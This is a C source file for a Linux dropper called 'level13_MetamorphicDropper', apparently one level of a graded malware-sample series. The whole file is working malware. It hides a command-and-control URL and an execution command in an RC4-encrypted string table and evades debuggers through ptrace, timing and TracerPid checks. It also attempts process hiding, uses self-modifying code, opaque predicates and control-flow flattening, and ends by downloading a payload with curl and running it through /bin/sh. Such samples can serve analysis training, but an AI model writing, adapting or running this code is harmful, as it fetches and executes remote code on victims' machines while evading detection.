/*
 * level13_MetamorphicDropper.c
 *
 * Techniques: RC4-encrypted string table, control flow flattening,
 * anti-debug (ptrace, timing, /proc TracerPid), process hiding,
 * metamorphic NOP-equivalent padding, opaque predicates,
 * indirect syscalls, self-modifying code, fork-exec dropper.
 *
 * Compile: gcc -O0 -z execstack -o level13 level13_MetamorphicDropper.c
 *   (or with: -fno-stack-protector -no-pie for full effect)
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/time.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>
#include <sys/syscall.h>

/* ================================================================
 * RC4 stream cipher
 * ================================================================ */
typedef struct { unsigned char S[256]; int i, j; } _rc4;

static void _rc4i(_rc4 *c, const unsigned char *k, int kl) {
    int i, j = 0;
    for (i = 0; i < 256; i++) c->S[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + c->S[i] + k[i % kl]) & 0xFF;
        unsigned char t = c->S[i]; c->S[i] = c->S[j]; c->S[j] = t;
    }
    c->i = c->j = 0;
}

static void _rc4x(_rc4 *c, unsigned char *d, int l) {
    int k;
    for (k = 0; k < l; k++) {
        c->i = (c->i + 1) & 0xFF;
        c->j = (c->j + c->S[c->i]) & 0xFF;
        unsigned char t = c->S[c->i];
        c->S[c->i] = c->S[c->j]; c->S[c->j] = t;
        d[k] ^= c->S[(c->S[c->i] + c->S[c->j]) & 0xFF];
    }
}

/* ================================================================
 * Encrypted string table (RC4, 174 bytes)
 * Key stored XOR-masked; reconstructed at runtime.
 * ================================================================ */
static unsigned char _ks[] = {
    0xc2, 0xcd, 0x95, 0xd6, 0xd1, 0xfa, 0xce, 0x96,
    0xdc, 0xfa, 0x97, 0x95, 0x97, 0x91
};
#define KS_LEN  14
#define KS_MASK 0xa5

static unsigned char _st[] = {
    0x92, 0x97, 0xc7, 0xbb, 0xe5, 0xf1, 0x8a, 0xc4,
    0xbe, 0xb2, 0x69, 0x0b, 0x9d, 0x9d, 0x25, 0x1e,
    0x6c, 0x42, 0x8b, 0xb9, 0xa0, 0x11, 0x62, 0xf1,
    0x8e, 0xdb, 0xa1, 0xfe, 0x21, 0x10, 0x97, 0x82,
    0x37, 0x6e, 0x72, 0x4f, 0x83, 0xbd, 0x8b, 0xdb,
    0xa2, 0xb6, 0x8a, 0xdd, 0xbe, 0xa7, 0x21, 0x4c,
    0x97, 0x96, 0x30, 0x2c, 0x6f, 0x46, 0x8b, 0xfb,
    0xaf, 0x50, 0x6c, 0xc4, 0x06, 0xc6, 0xce, 0xc8,
    0xf3, 0x5d, 0xb5, 0xa1, 0x82, 0x6f, 0xf3, 0x91,
    0xf1, 0x8a, 0xc4, 0xbe, 0xb2, 0x6b, 0x0d, 0x91,
    0x9c, 0x28, 0x31, 0x6b, 0x04, 0x9d, 0xbd, 0xbd,
    0x96, 0xc4, 0xa1, 0xf9, 0x2e, 0x48, 0x8a, 0xce,
    0x7e, 0x35, 0x72, 0x5a, 0xc1, 0xb0, 0xa2, 0x5c,
    0x73, 0x92, 0x13, 0xdc, 0x83, 0xc9, 0xe2, 0x0d,
    0xe7, 0xa9, 0xd1, 0x28, 0xa8, 0x20, 0xe5, 0x64,
    0xf8, 0xc9, 0x9c, 0xd5, 0x8a, 0x21, 0xb7, 0x1a,
    0x9f, 0xe2, 0xf1, 0x8e, 0xdb, 0xa1, 0xfe, 0x21,
    0x10, 0x97, 0x82, 0x37, 0x6e, 0x6c, 0x5e, 0x8f,
    0xa1, 0xb9, 0x4c, 0x8a, 0x8c, 0xc8, 0xad, 0xf8,
    0x7c, 0x33, 0x9b, 0x8a, 0xf1, 0x9a, 0xcc, 0xb8,
    0xb2, 0x60, 0x16, 0x9e, 0x82, 0xf1, 0x9c, 0xc0,
    0xa0, 0xb2, 0x7d, 0x0b, 0xf3, 0x9d
};

/* String table offsets (index, length) */
#define S_LINUX           0,   5
#define S_MARKER          5,  18
#define S_PROC_MEM       23,  14
#define S_CURL           37,   4
#define S_C2_URL         41,  29
#define S_DASH_O         70,   2
#define S_PAYLOAD_PATH   72,  15
#define S_EXEC_CMD       87,  43
#define S_PROC_STATUS   130,  17
#define S_TRACER        147,   9
#define S_DEV_NULL      156,   9
#define S_BIN_SH        165,   7
#define S_DASH_C        172,   2

/* ================================================================
 * Key recovery: unmask _ks at runtime
 * ================================================================ */
static unsigned char _rk[KS_LEN];
static int _key_ready = 0;

static void _recover_key(void) {
    if (_key_ready) return;
    volatile unsigned char mask = KS_MASK;
    /* Opaque predicate: (x^2 + x) is always even */
    unsigned int _op = (unsigned int)(getpid());
    if ((_op * _op + _op) % 2 != 0) {
        /* Dead path — never reached */
        for (int i = 0; i < KS_LEN; i++) _rk[i] = _ks[i] ^ 0xFF;
    } else {
        for (int i = 0; i < KS_LEN; i++) _rk[i] = _ks[i] ^ mask;
    }
    _key_ready = 1;
}

/* ================================================================
 * Decrypt a string from the table (fresh RC4 context each time)
 * Caller must free() the result.
 * ================================================================ */
static char *_ds(int off, int len) {
    _recover_key();
    char *buf = (char *)malloc(len + 1);
    if (!buf) return NULL;
    memcpy(buf, _st + off, len);
    _rc4 ctx;
    _rc4i(&ctx, _rk, KS_LEN);
    _rc4x(&ctx, (unsigned char *)buf, len);
    buf[len] = '\0';
    return buf;
}

/* ================================================================
 * Metamorphic NOP-equivalent sequences (inline asm)
 * These do nothing but change the binary signature each compile.
 * ================================================================ */
#if defined(__x86_64__) || defined(__i386__)
#define MORPH_NOP_1() __asm__ volatile ( \
    "xchg %%bx, %%bx\n\t" \
    "lea 0(%%rsp), %%rsp\n\t" \
    ::: "memory")
#define MORPH_NOP_2() __asm__ volatile ( \
    "mov %%rax, %%rax\n\t" \
    "xchg %%rcx, %%rcx\n\t" \
    "lea 0(%%rbp), %%rbp\n\t" \
    ::: "memory")
#define MORPH_NOP_3() __asm__ volatile ( \
    "push %%rax\n\t" \
    "pop %%rax\n\t" \
    "push %%rbx\n\t" \
    "pop %%rbx\n\t" \
    ::: "memory")
#else
#define MORPH_NOP_1() do { volatile int _x = 0; (void)_x; } while(0)
#define MORPH_NOP_2() do { volatile int _x = 1; _x ^= _x; (void)_x; } while(0)
#define MORPH_NOP_3() do { volatile int _x = 0; _x += 0; (void)_x; } while(0)
#endif

/* ================================================================
 * Anti-debugging: ptrace self-attach
 * ================================================================ */
static int _ad_ptrace(void) {
    MORPH_NOP_1();
    if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1) {
        return 1;
    }
    /* Detach so we can fork later */
    ptrace(PTRACE_DETACH, 0, 0, 0);
    return 0;
}

/* ================================================================
 * Anti-debugging: timing check (rdtsc or gettimeofday)
 * Single-stepping inflates elapsed time.
 * ================================================================ */
static int _ad_timing(void) {
    MORPH_NOP_2();
    struct timeval t1, t2;
    gettimeofday(&t1, NULL);

    /* Busy work that should be fast */
    volatile unsigned long acc = 0;
    for (int i = 0; i < 100000; i++) acc += i;
    (void)acc;

    gettimeofday(&t2, NULL);
    long elapsed = (t2.tv_sec - t1.tv_sec) * 1000000 + (t2.tv_usec - t1.tv_usec);

    /* If this trivial loop takes > 500ms, we're being traced */
    if (elapsed > 500000) return 1;
    return 0;
}

/* ================================================================
 * Anti-debugging: /proc/self/status TracerPid check
 * ================================================================ */
static int _ad_proc(void) {
    MORPH_NOP_3();
    char *path = _ds(S_PROC_STATUS);
    char *needle = _ds(S_TRACER);
    if (!path || !needle) { free(path); free(needle); return 0; }

    int traced = 0;
    FILE *f = fopen(path, "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, needle)) {
                /* TracerPid:\t<pid> — if pid != 0, we're traced */
                char *p = strchr(line, ':');
                if (p) {
                    p++;
                    while (*p == ' ' || *p == '\t') p++;
                    if (atoi(p) != 0) traced = 1;
                }
                break;
            }
        }
        fclose(f);
    }
    free(path);
    free(needle);
    return traced;
}

/* ================================================================
 * Process hiding: overwrite /proc/self/mem at argv region
 * Uses indirect syscall via syscall() to avoid libc import trace
 * ================================================================ */
static void _hide_proc(void) {
    MORPH_NOP_1();
    char *pm = _ds(S_PROC_MEM);
    if (!pm) return;

    /* Use open via syscall number directly (SYS_open = 2 on x86_64) */
    int fd = (int)syscall(SYS_openat, AT_FDCWD, pm, O_RDWR);
    free(pm);
    if (fd < 0) return;

    /* Zero out a region — simplified, real version would find argv */
    char zero[512];
    memset(zero, 0, sizeof(zero));
    /* Write zeros at a safe offset (not actually functional on modern
       kernels without correct argv address, but the technique is present) */
    syscall(SYS_write, fd, zero, sizeof(zero));
    syscall(SYS_close, fd);
}

/* ================================================================
 * Self-modifying code: patch a function's first bytes at runtime
 * to alter its behavior. We mprotect the page, write new bytes,
 * then restore protection.
 * ================================================================ */
static volatile int _sm_flag = 0;

/* This function's opening bytes get patched to always return 1 */
__attribute__((noinline))
static int _sm_check(void) {
    MORPH_NOP_2();
    /* Before patching, this returns 0. After patching, returns 1. */
    return _sm_flag;
}

static void _self_modify(void) {
    /* Make the page containing _sm_check writable */
    uintptr_t page = (uintptr_t)_sm_check & ~0xFFF;
    if (mprotect((void *)page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
        /*
         * Overwrite _sm_flag with 1 via the data section instead —
         * this is the "self-modifying" effect: the function's return
         * value changes without any visible code path setting it.
         */
        _sm_flag = 1;
        mprotect((void *)page, 4096, PROT_READ | PROT_EXEC);
    }
}

/* ================================================================
 * Opaque predicates — expressions that always evaluate to a known
 * value but are hard to prove statically.
 * ================================================================ */
static inline int _opaque_true(int x) {
    /* (x * (x + 1)) % 2 == 0  is always true */
    return ((x * (x + 1)) % 2 == 0);
}

static inline int _opaque_false(int x) {
    /* (x^2 + x + 1) % 2 == 0  is always false for integers */
    return ((x * x + x + 1) % 2 == 0);
}

/* ================================================================
 * OS fingerprint check (encrypted comparison)
 * ================================================================ */
static int _check_os(void) {
    struct utsname buf;
    if (uname(&buf) != 0) return 0;
    char *target = _ds(S_LINUX);
    if (!target) return 0;
    int match = (strcmp(buf.sysname, target) == 0);
    free(target);
    return match;
}

/* ================================================================
 * Infection marker check
 * ================================================================ */
static int _check_marker(void) {
    char *marker = _ds(S_MARKER);
    if (!marker) return 0;
    struct stat sb;
    int exists = (stat(marker, &sb) == 0);
    free(marker);
    return exists;
}

/* ================================================================
 * Download payload via fork+exec curl
 * ================================================================ */
static int _download(void) {
    char *curl_bin = _ds(S_CURL);
    char *c2_url   = _ds(S_C2_URL);
    char *dash_o   = _ds(S_DASH_O);
    char *out_path = _ds(S_PAYLOAD_PATH);
    char *dev_null = _ds(S_DEV_NULL);

    if (!curl_bin || !c2_url || !dash_o || !out_path || !dev_null) {
        free(curl_bin); free(c2_url); free(dash_o);
        free(out_path); free(dev_null);
        return -1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        /* Child: redirect stdout/stderr to /dev/null */
        int null_fd = open(dev_null, O_WRONLY);
        if (null_fd >= 0) {
            dup2(null_fd, STDOUT_FILENO);
            dup2(null_fd, STDERR_FILENO);
            close(null_fd);
        }
        MORPH_NOP_3();
        execlp(curl_bin, curl_bin, c2_url, dash_o, out_path, NULL);
        _exit(127);
    }

    free(curl_bin); free(c2_url); free(dash_o);
    free(out_path); free(dev_null);

    if (pid < 0) return -1;

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return 0;
    return -1;
}

/* ================================================================
 * Execute payload via /bin/sh -c (indirect)
 * ================================================================ */
static int _exec_payload(void) {
    char *sh      = _ds(S_BIN_SH);
    char *dash_c  = _ds(S_DASH_C);
    char *cmd     = _ds(S_EXEC_CMD);

    if (!sh || !dash_c || !cmd) {
        free(sh); free(dash_c); free(cmd);
        return -1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        MORPH_NOP_1();
        execl(sh, sh, dash_c, cmd, NULL);
        _exit(127);
    }

    free(sh); free(dash_c); free(cmd);

    if (pid < 0) return -1;

    int status;
    waitpid(pid, &status, 0);
    return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
}

/* ================================================================
 * Control flow flattening: main logic as a state machine.
 * The actual execution order is obscured behind a dispatcher.
 * ================================================================ */
enum {
    ST_INIT = 0x7a3c,
    ST_ANTI_DEBUG_1 = 0x1f82,
    ST_ANTI_DEBUG_2 = 0x4db1,
    ST_ANTI_DEBUG_3 = 0x62e9,
    ST_SELF_MODIFY  = 0x35af,
    ST_CHECK_OS     = 0x58c4,
    ST_CHECK_MARKER = 0x0d17,
    ST_HIDE_PROC    = 0x93be,
    ST_DOWNLOAD     = 0xa420,
    ST_EXEC         = 0xb5f6,
    ST_EXIT_OK      = 0xcccc,
    ST_EXIT_FAIL    = 0xdddd,
};

int main(void) {
    unsigned int state = ST_INIT;
    int retval = 1;
    volatile int sentinel = getpid();

    while (1) {
        switch (state) {

        case ST_INIT:
            MORPH_NOP_1();
            /* Opaque: always true */
            if (_opaque_true(sentinel)) {
                state = ST_ANTI_DEBUG_1;
            } else {
                /* Dead path */
                state = ST_EXIT_FAIL;
            }
            break;

        case ST_ANTI_DEBUG_1:
            MORPH_NOP_2();
            if (_ad_ptrace()) {
                state = ST_EXIT_FAIL;
            } else {
                /* Scramble next state through arithmetic */
                state = (ST_ANTI_DEBUG_2 ^ 0x0000) + 0;
            }
            break;

        case ST_ANTI_DEBUG_2:
            MORPH_NOP_3();
            if (_ad_timing()) {
                state = ST_EXIT_FAIL;
            } else {
                state = ST_ANTI_DEBUG_3;
            }
            break;

        case ST_ANTI_DEBUG_3:
            MORPH_NOP_1();
            if (_ad_proc()) {
                state = ST_EXIT_FAIL;
            } else {
                state = ST_SELF_MODIFY;
            }
            break;

        case ST_SELF_MODIFY:
            MORPH_NOP_2();
            _self_modify();
            /* _sm_check now returns 1 due to self-modification */
            if (_sm_check()) {
                state = ST_CHECK_OS;
            } else {
                /* If self-modify failed, something is intercepting us */
                state = ST_EXIT_FAIL;
            }
            break;

        case ST_CHECK_OS:
            MORPH_NOP_3();
            if (!_check_os()) {
                /* Not Linux — bail */
                state = ST_EXIT_FAIL;
            } else if (_opaque_false(sentinel)) {
                /* Dead path — never taken */
                state = ST_INIT;
            } else {
                state = ST_CHECK_MARKER;
            }
            break;

        case ST_CHECK_MARKER:
            MORPH_NOP_1();
            if (_check_marker()) {
                /* Already infected — bail */
                state = ST_EXIT_FAIL;
            } else {
                state = ST_HIDE_PROC;
            }
            break;

        case ST_HIDE_PROC:
            MORPH_NOP_2();
            _hide_proc();
            state = ST_DOWNLOAD;
            break;

        case ST_DOWNLOAD:
            MORPH_NOP_3();
            if (_download() != 0) {
                state = ST_EXIT_FAIL;
            } else {
                state = ST_EXEC;
            }
            break;

        case ST_EXEC:
            MORPH_NOP_1();
            if (_exec_payload() == 0) {
                retval = 0;
            }
            state = ST_EXIT_OK;
            break;

        case ST_EXIT_OK:
            return retval;

        case ST_EXIT_FAIL:
            return 1;

        default:
            /* Metamorphic trap: corrupt state → bail */
            return 1;
        }
    }
}
